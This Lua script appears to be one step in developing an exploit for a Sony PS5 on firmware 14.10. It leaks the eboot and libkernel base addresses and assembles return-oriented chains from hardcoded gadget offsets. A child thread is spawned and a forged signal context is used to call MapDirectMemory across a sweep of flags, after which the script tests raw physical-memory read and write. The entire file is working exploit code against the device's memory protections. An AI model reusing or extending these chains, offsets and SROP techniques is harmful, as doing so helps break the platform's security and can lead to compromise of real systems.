-- CRASH_CLASS: MODERATE
-- PROBE 552c: MapDirectMemory via child thread SROP (proven mechanism)
--
-- 552b confirmed: child SROP with inline epilogue works (getpid=pid).
-- Now apply the same pattern to MapDirectMemory (7-arg wrapper at
-- libkernel+0x15020).
--
-- MapDirectMemory ABI (SysV C calling convention):
--   rdi = void **virtAddrOut
--   rsi = size_t len
--   rdx = int prot
--   rcx = int flags
--   r8  = off_t physAddr
--   r9  = size_t alignment
--   [rsp+8] = const char *name (7th arg on stack)
--
-- Child flow:
--   1. ROP: sysarch(SET_FSBASE) [via sc_addr]
--   2. ROP: marker 0xAAAA
--   3. ROP: sigreturn(uctx) → MapDirectMemory → inline epilogue at fn_rsp
--   4. epilogue: done flag → thr_exit
--
-- mcontext offsets (Sony PS5 14.10, at ucontext+0x40):
--   +0x08=rdi +0x10=rsi +0x18=rdx +0x20=r10 +0x28=r8 +0x30=r9
--   +0x38=rax +0x40=rbx +0x48=rbp +0x50=rcx
--   +0xA0=rip +0xB8=rsp

print("=== PROBE 552c: MAP DIRECT MEMORY (proven SROP) ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(v)
    if v == nil then return "nil" end
    local h, l = get_hi_lo(v)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b, n) for o = 0, n - 4, 4 do wd(b + o, 0) end end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid end

local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1))
pcall(function() mk(416)(uint64(12), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa_buf, uint64(0)) end)

-- eboot
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local eb_lo = rd(N(ib) + 0x108) or 0
local eb_hi = rd(N(ib) + 0x10C) or 0
if eb_lo < 0 then eb_lo = eb_lo + 0x100000000 end
if eb_hi < 0 then eb_hi = eb_hi + 0x100000000 end
print(string.format("eboot=0x%X%08X", eb_hi, eb_lo))
local eboot = uint64(string.format("0x%X%08X", eb_hi, eb_lo))
local function eaddr(off) return eboot + uint64(off) end

-- libkernel
local ib2 = memory.alloc(0x200)
wd(N(ib2), 0x160)
pcall(function() mk(593)(uint64(0x2001), ib2) end)
local lk_lo = rd(N(ib2) + 0x108) or 0
local lk_hi = rd(N(ib2) + 0x10C) or 0
if lk_lo < 0 then lk_lo = lk_lo + 0x100000000 end
if lk_hi < 0 then lk_hi = lk_hi + 0x100000000 end

if lk_lo == 0 and lk_hi == 0 then
    for h = 0, 0x100 do
        local ib3 = memory.alloc(0x200)
        wd(N(ib3), 0x160)
        local ok3, r3 = pcall(function() return mk(593)(uint64(h), ib3) end)
        if ok3 and N(r3) == 0 then
            local name = ""
            for i = 0, 31 do
                local b = rd(N(ib3) + 8 + i)
                if b then
                    local c = b % 256
                    if c == 0 then break end
                    if c >= 32 and c < 127 then name = name .. string.char(c) end
                end
            end
            if name:find("libkernel") then
                lk_lo = rd(N(ib3) + 0x108) or 0
                lk_hi = rd(N(ib3) + 0x10C) or 0
                if lk_lo < 0 then lk_lo = lk_lo + 0x100000000 end
                if lk_hi < 0 then lk_hi = lk_hi + 0x100000000 end
                break
            end
        end
    end
end
if lk_lo == 0 and lk_hi == 0 then print("FAIL: libkernel not found"); return end
print(string.format("libkernel=0x%X%08X", lk_hi, lk_lo))
local lk_text = uint64(string.format("0x%X%08X", lk_hi, lk_lo))
local function lkaddr(off) return lk_text + uint64(off) end

-- Gadgets
local G = {
    pop_rax  = 0x992,
    pop_rdi  = 0xC9DFE,
    pop_rsi  = 0xD77D,
    pop_rdx  = 0x3B02D7,
    pop_rcx  = 0xE64,
    mov_m    = 0x92C67,
    bare_ret = 0x42,
}

-- sc_addr
local MC = 0x40
local gc_ctx = memory.alloc(0x500)
pcall(function() return mk(421)(uint64(gc_ctx)) end)
local rip_val = rq(N(gc_ctx) + MC + 0xA0)
if not rip_val then print("FAIL: getcontext"); return end
local rh, rl = get_hi_lo(rip_val)
if rh < 0 then rh = rh + 0x100000000 end
if rl < 0 then rl = rl + 0x100000000 end
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))
print("sc_addr=" .. fmt(sc_addr))

-- ============================================================
-- [A] AllocateDirectMemory
-- ============================================================
print("")
print("[A] AllocateDirectMemory")

local alloc_fn = lkaddr(0x17EF0)
local phys_out = memory.alloc(8)
wq(N(phys_out), uint64(0))

local ok_a, alloc_rv = pcall(function()
    return native.fcall_with_rax(alloc_fn, 0,
        uint64(0), uint64("0x150000000"), uint64(0x4000),
        uint64(0x4000), uint64(0), uint64(N(phys_out)))
end)
if not ok_a then print("  CRASHED"); return end
print("  ret=" .. N(alloc_rv))
local phys_addr = rq(N(phys_out))
print("  phys=" .. fmt(phys_addr))
if not phys_addr or N(alloc_rv) ~= 0 then print("  ALLOC FAILED"); return end
print("  OK")
if not alive() then print("DIED after alloc"); return end

-- ============================================================
-- [B] MapDirectMemory via child SROP (flag sweep)
-- ============================================================
print("")
print("[B] MapDirectMemory via child SROP")

local sc455 = mk(455)
local sc_mmap = mk(477)
local map_fn = lkaddr(0x15020)
print("MapDirectMemory=" .. fmt(map_fn))

local map_ok = false
local mapped_va = nil

local flag_list = {0, 0x10, 0x12, 1, 2, 0x100, 0x412, 0x1000, 0x10002}

for fi, flags in ipairs(flag_list) do
    if not alive() then print("PROCESS DIED"); return end

    local shared = memory.alloc(0x100)
    z(shared, 0x100)

    local virt_out = memory.alloc(8)
    wq(N(virt_out), uint64(0))

    -- Child stack (2 MiB)
    local cs_raw = sc_mmap(uint64(0), uint64(0x200000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    if not cs_raw or N(cs_raw) == 0 then print("  stack mmap fail"); return end
    local cstack = N(cs_raw)

    -- Fake TCB
    local tcb = memory.alloc(0x1000)
    z(tcb, 0x1000)
    wq(N(tcb), uint64(N(tcb)))
    local tcb_ptr = memory.alloc(8)
    wq(N(tcb_ptr), uint64(N(tcb)))

    -- ============================================================
    -- Inline epilogue at fn_rsp (proven pattern from 552b)
    -- MapDirectMemory returns → pop_rax (skips 7th arg) → epilogue
    -- ============================================================
    local fn_rsp = cstack + 0x3008
    local sp = fn_rsp
    local function spwq(v) wq(sp, v); sp = sp + 8 end

    -- [fn_rsp+0x00]: return address (MapDirectMemory's ret pops this)
    spwq(eaddr(G.pop_rax))           -- skip 7th arg via pop_rax (clobbers rax)

    -- [fn_rsp+0x08]: 7th arg (name = NULL), consumed by pop_rax
    spwq(uint64(0))

    -- Epilogue starts at fn_rsp+0x10 (RSP after pop_rax + ret)
    -- Write sysarch-complete marker at shared+0x10 to mean "MapDM returned"
    spwq(eaddr(G.pop_rax))
    spwq(uint64(0xCAFE))
    spwq(eaddr(G.pop_rdi))
    spwq(uint64(N(shared) + 0x10))
    spwq(eaddr(G.mov_m))             -- [shared+0x10] = 0xCAFE ("returned" marker)

    -- Done flag
    spwq(eaddr(G.pop_rax))
    spwq(uint64(0xDEAD))
    spwq(eaddr(G.pop_rdi))
    spwq(uint64(N(shared) + 0x18))
    spwq(eaddr(G.mov_m))             -- [shared+0x18] = 0xDEAD

    -- thr_exit(431)
    spwq(eaddr(G.pop_rax))
    spwq(uint64(431))
    spwq(eaddr(G.pop_rdi))
    spwq(uint64(0))
    spwq(sc_addr)

    -- ============================================================
    -- Build ucontext (pre-filled from parent, then patched)
    -- ============================================================
    local uctx = memory.alloc(0x500)
    local uctx_addr = N(uctx)
    pcall(function() return mk(421)(uint64(uctx_addr)) end)

    -- Patch for MapDirectMemory call
    wq(uctx_addr + MC + 0xA0, map_fn)             -- mc_rip = MapDirectMemory
    wq(uctx_addr + MC + 0xB8, uint64(fn_rsp))     -- mc_rsp = fn_rsp
    wq(uctx_addr + MC + 0x08, uint64(N(virt_out)))-- mc_rdi = &virt_out
    wq(uctx_addr + MC + 0x10, uint64(0x4000))     -- mc_rsi = len (16KB)
    wq(uctx_addr + MC + 0x18, uint64(3))          -- mc_rdx = PROT_READ|PROT_WRITE
    wq(uctx_addr + MC + 0x50, uint64(flags))      -- mc_rcx = flags
    wq(uctx_addr + MC + 0x28, phys_addr)           -- mc_r8 = physAddr
    wq(uctx_addr + MC + 0x30, uint64(0x4000))     -- mc_r9 = alignment

    -- ============================================================
    -- Child ROP chain: sysarch → marker → sigreturn
    -- ============================================================
    local chain_off = 0x100000
    local chain_base = cstack + chain_off + 8
    local pos = chain_base
    local function emit(v) wq(pos, v); pos = pos + 8 end

    -- sysarch(SET_FSBASE=129, &tcb_ptr)
    emit(eaddr(G.pop_rax)); emit(uint64(165))
    emit(eaddr(G.pop_rdi)); emit(uint64(129))
    emit(eaddr(G.pop_rsi)); emit(uint64(N(tcb_ptr)))
    emit(sc_addr)

    -- Marker: sysarch done
    emit(eaddr(G.pop_rax)); emit(uint64(0xAAAA))
    emit(eaddr(G.pop_rdi)); emit(uint64(N(shared)))
    emit(eaddr(G.mov_m))

    -- sigreturn → MapDirectMemory
    emit(eaddr(G.pop_rax)); emit(uint64(417))
    emit(eaddr(G.pop_rdi)); emit(uint64(uctx_addr))
    emit(sc_addr)

    -- thr_new
    local child_stack_sz = chain_off + 0x10
    local param = memory.alloc(0x40)
    z(param, 0x40)
    wq(N(param) + 0x00, eaddr(G.bare_ret))
    wq(N(param) + 0x08, uint64(0))
    wq(N(param) + 0x10, uint64(cstack))
    wq(N(param) + 0x18, uint64(child_stack_sz))
    local tid_p = memory.alloc(8)
    wq(N(tid_p), uint64(0))
    wq(N(param) + 0x30, uint64(N(tid_p)))

    io.flush()
    local ok_t, ret_t = pcall(function()
        return sc455(uint64(N(param)), uint64(0x38))
    end)

    if not ok_t or (ret_t and N(ret_t) ~= 0) then
        print(string.format("  [%d] flags=0x%X: thr_new FAIL", fi, flags))
    else
        -- Wait for done flag
        local done = false
        for timeout = 1, 1000000 do
            local flag = rq(N(shared) + 0x18)
            if flag and N(flag) == 0xDEAD then
                done = true
                break
            end
            if timeout % 200000 == 0 and not alive() then break end
        end

        local m_sysarch = rq(N(shared))
        local m_returned = rq(N(shared) + 0x10)
        local va = rq(N(virt_out))

        if not alive() then
            print(string.format("  [%d] flags=0x%X: KILLED sysarch=%s returned=%s",
                fi, flags,
                m_sysarch and fmt(m_sysarch) or "nil",
                m_returned and fmt(m_returned) or "nil"))
            return
        end

        if done then
            print(string.format("  [%d] flags=0x%X: returned=%s va=%s DONE",
                fi, flags,
                m_returned and fmt(m_returned) or "nil",
                va and fmt(va) or "nil"))

            if va then
                local vah, val_ = get_hi_lo(va)
                if vah < 0 then vah = vah + 0x100000000 end
                if val_ < 0 then val_ = val_ + 0x100000000 end
                if vah ~= 0 or val_ > 0x1000 then
                    print("  *** MapDirectMemory SUCCEEDED ***")
                    mapped_va = va
                    map_ok = true
                    break
                end
            end
        else
            print(string.format("  [%d] flags=0x%X: TIMEOUT sysarch=%s returned=%s",
                fi, flags,
                m_sysarch and fmt(m_sysarch) or "nil",
                m_returned and fmt(m_returned) or "nil"))
        end
    end
end

-- ============================================================
-- [C] Physical memory R/W test
-- ============================================================
if map_ok and mapped_va then
    print("")
    print("[C] Physical memory R/W")
    print("  phys=" .. fmt(phys_addr))
    print("  virt=" .. fmt(mapped_va))

    local ok_w = pcall(function() memory.write_dword(mapped_va, 0xDEADBEEF) end)
    print("  write 0xDEADBEEF: " .. tostring(ok_w))

    local v = rd(mapped_va)
    print("  read back: " .. (v and string.format("0x%X", v) or "nil"))

    if v and v == 0xDEADBEEF then
        print("")
        print("  *** PHYSICAL MEMORY R/W CONFIRMED ***")
    end
else
    print("")
    print("MapDirectMemory failed for all flags")
end

print("")
print("DONE")
